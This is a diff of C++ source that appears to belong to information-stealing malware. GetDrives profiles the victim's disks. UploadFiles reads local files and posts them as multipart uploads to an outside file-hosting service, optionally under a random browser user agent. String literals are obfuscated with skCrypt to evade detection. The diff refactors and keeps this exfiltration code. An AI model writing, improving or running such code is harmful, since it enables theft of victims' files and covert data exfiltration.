@@ -171,7 +171,7 @@ string GetDrives() {
                 (string)skCrypt("/") <<
                 totalNumberOfBytes.QuadPart / (1024.0 * 1024.0 * 1024.0) <<
                 (string)skCrypt(" GB - ") <<
-                static_cast<int>((totalNumberOfBytes.QuadPart - totalNumberOfFreeBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0)) <<
+                static_cast<double>(totalNumberOfBytes.QuadPart - totalNumberOfFreeBytes.QuadPart) / static_cast<double>(totalNumberOfBytes.QuadPart) * 100 <<
                 (string)skCrypt("%); ");
 
             drive += strlen(drive) + 1;
@@ -571,15 +571,21 @@ cleanup:
 
 void UploadFiles(const vector<string>& files) {
     for (string file : files) {
+        string crlf = (string)skCrypt("\r\n");
+        string sep = (string)skCrypt("--");
         string boundary = (string)skCrypt("$$") + GenerateRandom(32) + (string)skCrypt("$$");
         string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
-        string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") + Split(file, '\\').back() + (string)skCrypt("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
-        string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
+        string beggining = sep + boundary + crlf +
+            (string)skCrypt("Content-Disposition: form-data; name=\"file\"; filename=\"") + Split(file, '\\').back() + (string)skCrypt("\"") + crlf +
+            (string)skCrypt("Content-Type: application/octet-stream") + crlf + crlf;
+        string ending = crlf + sep + boundary + sep + crlf;
+#if RANDOM_USERAGENT
+        string userAgent = GetRandomUserAgent();
+#else
         string userAgent = userAgents[0];
-        if (RANDOM_USERAGENT)
-            userAgent = GetRandomUserAgent();
+#endif
 
-        ifstream rFile(file, ios::in);
+        ifstream rFile(file);
         stringstream buffer;
         buffer << rFile.rdbuf();
         rFile.close();
@@ -599,7 +605,7 @@ void UploadFiles(const vector<string>& files) {
         if (!hrequest)
             goto cleanup;
 
-        if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
+        if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.length()))
             goto cleanup;
 
         DWORD received;
@@ -611,7 +617,10 @@ void UploadFiles(const vector<string>& files) {
             str[sizeof(buf)] = 0;
             Json data = Json::parse(str);
             if (data[(string)skCrypt("status")])
-                filesLink.push_back((string)data[(string)skCrypt("data")][(string)skCrypt("file")][(string)skCrypt("url")][(string)skCrypt("full")]);
+                filesLink.push_back((string)data[(string)skCrypt("data")]
+                                                [(string)skCrypt("file")]
+                                                [(string)skCrypt("url")]
+                                                [(string)skCrypt("full")]);
             else
                 filesLink.push_back((string)skCrypt("none"));
         }
